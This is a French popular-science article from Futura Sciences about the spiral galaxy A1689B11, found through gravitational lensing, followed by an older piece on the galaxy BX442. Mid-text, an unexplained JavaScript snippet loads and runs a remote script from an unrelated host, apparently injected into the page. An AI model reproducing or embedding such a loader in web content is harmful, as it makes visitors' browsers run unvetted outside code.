{"title": "La plus ancienne galaxie spirale jamais decouverte", "newspaper": "Futura Sciences", "author": ["Laurent Sacco"], "date_publi": "2017-11-08", "content": "La plus ancienne galaxie spirale connue a ce jour a ete debusquee a l'aide d'une lentille gravitationnelle. Les astronomes l'ont vue telle qu'elle etait il y a... 11 milliards d'annees ! Son etude devrait aider a comprendre comment sont nees les galaxies, a partir notamment de fusions chaotiques de galaxies naines. Ce qu'il faut retenir Des telescopes comme Hubble ont montre que les galaxies spirales etaient de plus en plus rares en remontant dans le passe mais que le nombre de galaxies irregulieres de petite taille augmentait. Ces observations s'expliquent en postulant que les premieres galaxies etaient naines et qu'elles entraient frequemment en collision en fusionnant. Beaucoup plus regulieres, les galaxies spirales seraient le produit de ces fusions, mais, pour comprendre vraiment comment s'est effectue le passage de la premiere etape a la suivante, les astronomes cherchent a observer les galaxies spirales les plus jeunes. Le record vient d'etre battu par une galaxie spirale vue comme elle etait il y a 11 milliards d'annees. Les cosmologistes et les astrophysiciens continuent d'explorer le monde des nebuleuses, ouvert il y a presque un siecle par  Edwin Hubble . Il ne s'agit pas simplement d'une question de geographie, mais aussi d'histoire, de notre histoire, puisque le Soleil est membre d'une de ces nebuleuses, une  galaxie spirale  barree connue de l'humanite sous le nom de  Voie lactee . La cosmogonie est donc une branche de la genealogie de l'Homme. C'est pour cela que ce dernier cherche a comprendre d'ou viennent les galaxies, en particulier les  galaxies spirales , qui constituent presque les deux tiers des galaxies dans l' univers  actuel. Celles-ci ont evolue durant des milliards d'annees et, comme toutes leurs cousines, elles sont considerees comme un gaz autogravitant d' etoiles . Toutefois, il ne s'agit pas exactement d'un gaz. En effet, les forces entre etoiles sont de longue portee et decroissent lentement avec la distance, ce qui n'est pas le cas dans un vrai gaz. De plus, dans ce dernier, l'effet des collisions entre les molecules et les atomes est en general important. En fait, le fluide d'etoiles des galaxies se comporte plutot comme un plasma, tel celui qui devrait etre produit dans Iter. En termes techniques, sa description fait appel a l'equation de Vlasov plutot qu'a celle de Boltzmann, comme le rappelle  Andre Brahic  dans ses lecons d'astronomie. Une vue d'artiste d'un amas de galaxies a l'origine d'un effet de lentille gravitationnelle revelant au regard du telescope Gemini Nord la plus ancienne galaxie spirale connue a ce jour. (c) James Josephides                               La genese des galaxies spirales Les observations et cette equation, que la gravitation gouverne, nous permettent de construire un scenario dans lequel de petites  galaxies naines  sont nees quelques centaines de millions d'annees apres le  Big Bang  et sont ensuite entrees en collision pour, parfois, fusionner en donnant des galaxies de plus en plus grosses, qui ont absorbe a leur tour d'autres galaxies naines.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Les premieres galaxies sont souvent d'aspect irregulier quand elles sont observees et des flambees d'etoiles en formation y sont monnaie courante. Les chercheurs ont ete surpris de voir que des grandes galaxies spirales, qui croissent aussi en accretant du gaz provenant de gigantesques courants d'hydrogene et d'helium froid, se soient formees tres rapidement. Ils cherchent a en comprendre les raisons en profondeur, notamment en poussant les instruments a leurs limites, pour voir toujours plus loin, et donc toujours plus tot. L'objectif est de comprendre les processus qui font passer des petites galaxies chaotiques et turbulentes en collision aux disques calmes et majestueux telles la galaxie d'Andromede ou la galaxie du Moulinet. Une presentation des telescopes Gemini. Pour obtenir une traduction en francais assez fidele, cliquez sur le rectangle blanc en bas a droite. Les sous-titres en anglais devraient alors apparaitre. Cliquez ensuite sur l'ecrou a droite du rectangle, puis sur << Sous-titres >> et enfin sur << Traduire automatiquement >>. Choisissez << Francais >>. (c)  Gemini Observatory A1689B11, une galaxie sujette a un effet de lentille gravitationnelle Une equipe internationale d'astronomes vient justement d'annoncer  via  un article sur  arXiv  qu'elle avait decouvert la galaxie spirale la plus ancienne connue a ce jour, observee telle qu'elle etait il y a 11 milliards d'annees. Pour accomplir cet exploit, il a fallu utiliser le  Near-Infrared Integral Field Spectrograph  equipant le telescope Gemini Nord, a Hawai. Mais l'observation de A1689B11 n'aurait pas ete possible sans un coup de pouce de la nature. La galaxie spirale est en effet sujette a un effet de lentille gravitationnelle produit par un  amas de galaxies  qui s'interpose entre A1689B11 et la  Voie lactee . C'est cet effet de grossissement qui a permis d'observer la jeune spirale alors que l'univers observable avait environ 2,7 milliards d'annees et qu'elle formait des etoiles 20 fois plus rapidement que les galaxies spirales les plus proches de nous observees actuellement. On devrait en apprendre bien plus sur l'origine et l'evolution des galaxies dans quelques annees grace au lancement du telescope spatial  James Webb . Pour en savoir plus  BX442, la grande galaxie spirale qui ne devrait pas exister Article de Laurent Sacco publie le 25/07/2012 Une grande galaxie spirale observee par les  telescopes Hubble  et  Keck  rend quelque peu perplexes les astrophysiciens. Agee de presque 11 milliards d'annees, une telle galaxie ne devrait etre apparue que des milliards d'annees plus tard dans l'histoire du cosmos observable. Visiblement, il nous manque encore des pieces du puzzle de la formation et de l'evolution des galaxies. Un groupe d'astrophysiciens vient de publier dans  Nature   un article sur la decouverte par Hubble de la galaxie BX442. C'est une grande  galaxie spirale , comme il en existe de nos jours tout autour de la Voie lactee. La plus celebre, outre notre Galaxie qui est aussi une spirale, est sans aucun doute celle d' Andromede . De prime abord, BX442 ne semble rien avoir de particulier. Elle n'est pas meme la galaxie la plus lointaine connue, dont le record de distance semble etre detenu, jusqu'a present, par  SXDF-NB1006-2 . Il est represente ici une vraie image de la grande galaxie spirale BX442 telle qu'elle etait il y a 10,7 milliards d'annees. Elle a ete composee a partir d'observations faites par Hubble et le telescope Keck a Hawai. (c) David Law,  Dunlap Institute for Astronomy & Astrophysics                               Alors, pourquoi la decouverte de cette grande galaxie spirale fait-elle parler d'elle ? Pour le comprendre, il faut savoir que d'apres la theorie de la  matiere noire  froide, les galaxies sont les premieres structures apparues dans l'univers. Naines pour la plupart, elles ont ensuite fusionne et se sont assemble pour constituer des amas de galaxies, lesquels se sont regroupes, aboutissant a la structure filamenteuse ponctuee de vides immenses que l'on observe actuellement. Les simulations basees sur ce scenario, comme  Deus  qui fait intervenir l' energie noire , fonctionnent remarquablement bien, meme s'il reste encore quelques desaccords avec les observations. En particulier, on ne comprend pas toujours comment de grandes galaxies ont pu se former tres tot dans l'histoire du cosmos, meme si des explications sont plausibles, comme la theorie des  courants froids . La decouverte de BX442 entre precisement dans ce cas de figure. Au depart, les astronomes avaient debusque cette galaxie spirale dans un echantillon de 300 galaxies tres lointaines presentes sur des images prises par Hubble. Les mesures indiquaient que l'on voyait BX442 telle qu'elle etait voici environ 10,7 milliards d'annees. Il n'est pas question ici d'image reelle de la galaxie spirale BX442. En effet, l'image brute, reconstruite a partir des observations d'Hubble et du Keck, est plus grossiere. Mais elle a permis a un artiste de reconstituer ce que l'on verrait probablement si l'on etait beaucoup plus proche de cet astre. (c) Joe Bergeron,  Dunlap Institute for Astronomy & Astrophysics                       BX442, une vraie galaxie spirale en rotation Or, d'apres la theorie et les observations faites jusqu'a present, il ne s'est pas encore ecoule suffisamment de temps a cette epoque pour que l'immense majorite de l'univers observable, ne il y a 13,7 milliards d'annees, ne soit pas constituee essentiellement de petites  galaxies irregulieres , croissant par des captures successives de  galaxies naines . De grandes galaxies, et encore plus avec des structures regulieres, comme celles des spirales et elliptiques qui sont communes depuis quelques milliards d'annees dans l'univers observable, devaient etre rares. BX442 derange donc clairement les modeles en vigueur. Tellement, d'ailleurs, que les astrophysiciens ont tout de suite pense a une illusion d'optique causee par deux images d'objets galactiques superposes. Etant donnee la distance, les observations ne montrent pas une image aussi nette que celles des somptueuses galaxies observees par  Hubble , que l'on est habitue a voir. Pour en avoir le coeur net, les astrophysiciens ont entrepris d'utiliser les instruments plus performants du telescope Keck au sol, pour les mesures spectroscopiques. Ces mesures sont essentielles pour affiner les distances et les  vitesses  de rotation des etoiles presentes dans une  galaxie . Avec le  spectrographe   Osiris , les chercheurs ont etudie les  spectres  de 3.600 regions des images associees a BX442. Il a fallu se rendre a l'evidence. Ils etaient bien en presence d'une seule grande galaxie spirale en rotation, deja bien formee et massive tot dans l'histoire du cosmos observable. Elle reste quand meme une exception, ce qui veut dire qu'elle ne remet nullement en cause l'age de l'univers et encore moins la theorie du  Big Bang . ", "theme": "sciences"}